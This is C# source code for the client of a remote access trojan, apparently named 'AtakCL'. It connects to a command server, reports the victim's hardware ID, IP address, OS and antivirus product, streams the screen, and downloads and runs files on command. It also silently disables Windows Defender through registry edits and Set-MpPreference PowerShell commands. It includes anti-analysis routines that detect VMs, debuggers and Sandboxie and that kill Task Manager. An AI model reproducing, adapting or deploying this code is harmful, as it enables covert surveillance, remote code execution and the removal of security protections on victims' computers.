using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
using System.Management;
using System.IO;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace AtakCL
{
    class Program
    {
        private static Mutex mutex;
        static byte[] buffer = new byte[short.MaxValue];
        static Socket socket = default(Socket);

        static bool isScr = false;

        static void Main(string[] args)
        {
            //new Thread(() =>
            //{
            //    RunAntiAnalysis();
            //}).Start();
            mutex = new Mutex(true, "12392481yırhkasudı");
            if (!mutex.WaitOne(0, false))
            {
                return;
            }
            connectSV();
            for (;;)
            {
                try
                {
                    socket.Send(new byte[1]);
                }
                catch (Exception)
                {
                    connectSV();
                }
                
                Thread.Sleep(20);
            }          
        }

        static void connectSV()
        {
            try
            {
                IPEndPoint endPoint = new IPEndPoint(Dns.GetHostAddresses("127.0.0.1")[0], 9999);
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(endPoint);
                sendWelcomeInfo();
                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(serverCallback), socket);
            }
            catch (Exception ex)
            {
                connectSV();
            }
        }

        static void serverCallback(IAsyncResult res)
        {
            try
            {
                Socket socket = (Socket)res.AsyncState;
                int val = socket.EndReceive(res);
                string[] sData = Encoding.UTF8.GetString(buffer, 0, val).Split('|');

                if (sData[0] != null)
                {
                    switch (sData[0])
                    {
                        case "MSG":
                            Thread t1 = new Thread(() => showMessage(sData[1], sData[2], sData[3]));
                            t1.Start();
                            break;
                        case "SCR":
                            Thread t2 = new Thread(() => streamScreen(5));
                            switch (sData[1])
                            {
                                case "1":
                                    isScr = true;
                                    t2.Start();
                                    break;
                                case "0":
                                    isScr = false;
                                    break;
                            }
                            break;
                        case "FILE":
                            int len = Convert.ToInt32(sData[1]);
                            string ext = sData[2];

                            byte[] fileBuffer = new byte[len + 10]; 
                            socket.Receive(fileBuffer, len, SocketFlags.None);
                            Thread t3 = new Thread(() => fileProc(fileBuffer, ext));
                            t3.Start();
                            break;
                        case "START":
                            Thread t4 = new Thread(() => startApp(sData[1]));
                            t4.Start();
                            break;
                        case "DEFENDER":
                            Thread t5 = new Thread(() => disableDefender());
                            t5.Start();
                            break;
                        case "CLICK":
                            Thread t6 = new Thread(() => clickScreen(sData[1], sData[2]));
                            t6.Start();
                            break;
                        case "CLOSE":
                            Environment.Exit(0);
                            break;
                    }
                }
                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(serverCallback), socket);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }
        }
       
        static void sendWelcomeInfo()
        {
            ManagementObjectSearcher wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
            ManagementObjectCollection data = wmiData.Get();

            string name = "";
            foreach (ManagementObject virusChecker in data)
            {
                var virusCheckerName = virusChecker["displayName"];
                name = virusCheckerName.ToString();
            }
            byte[] bytes = Encoding.UTF8.GetBytes($"CONN|{getHWID()}|{Environment.MachineName}|{getIP()}|{getOS()}|{name}");
            socket.Send(bytes);
        }
        static void showMessage(string title, string content, string style)
        {
            switch (style)
            {
                case "INFO":
                    MessageBox.Show(content, title, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
                case "QUES":
                    MessageBox.Show(content, title, MessageBoxButtons.OK, MessageBoxIcon.Question);
                    break;
                case "WARN":
                    MessageBox.Show(content, title, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    break;
                case "ERRO":
                    MessageBox.Show(content, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    break;
            }
        }

        static string getIP()
        {
            WebClient web = new WebClient();
            return web.DownloadString("https://api.ipify.org");
        }
        static string getHWID()
        {
            var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
            ManagementObjectCollection mbsList = mbs.Get();
            string id = "";
            foreach (ManagementObject mo in mbsList)
            {
                id = mo["ProcessorId"].ToString();
                break;
            }
            return id;
        }
        static string getOS()
        {
            var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                        select x.GetPropertyValue("Caption")).FirstOrDefault();
            return name != null ? name.ToString() : "Unknown";
        }
        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (key == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                        return;
                    }
                    if (key.GetValue(name) != (object)value)
                        key.SetValue(name, value, RegistryValueKind.DWord);
                }
            }
            catch { }
        }
        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }
        private static void RunPS(string args)
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
        }

        static void streamScreen(int fps)
        {
            while (isScr)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        bmp.Save(ms, ImageFormat.Png);
                    }                               
                    byte[] array = ms.ToArray();
                    socket.Send(Encoding.UTF8.GetBytes("SCRPNG|" + array.Length.ToString()));
                    socket.Send(array, array.Length, SocketFlags.None);
                    ms.SetLength(0);
                }
                Thread.Sleep(1000 / fps);
                GC.Collect();
            }           
        }
        static void fileProc(byte[] fileBuff, string ext)
        {
            string path = Path.GetTempPath() + "temp" + ext;
            using (Stream file = File.OpenWrite(path))
            {
                file.Write(fileBuff, 0, fileBuff.Length);
                
                Thread t = new Thread(() => startFile(path));
                t.Start();
            }
        }
        static void startFile(string path)
        {
            Process.Start(path);            
        }
        static void startApp(string path)
        {
            Process.Start(path);
        }
        static void disableDefender()
        {
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
        }
        static void clickScreen(string x, string y)
        {
            int xx = Convert.ToInt32(x);
            int yy = Convert.ToInt32(y);
            SetCursorPos(xx, yy);
            uint X = (uint)Cursor.Position.X;
            uint Y = (uint)Cursor.Position.Y;
            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)X, (uint)Y, 0, 0);
        }

        public static void RunAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                Environment.FailFast(null);

            while (true)
            {
                DetectProcess();
                Thread.Sleep(10);
            }
        }
        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }
        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }
        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }
        private static void DetectProcess()
        {
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (ProcessName.Contains(process.ProcessName))
                        process.Kill();
                }
                catch { }
            }
        }

        [DllImport("user32.dll", EntryPoint = "SetCursorPos")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetCursorPos(int x, int y);
        private readonly static List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr" };
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
        //Mouse actions
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
    }                 
}                                      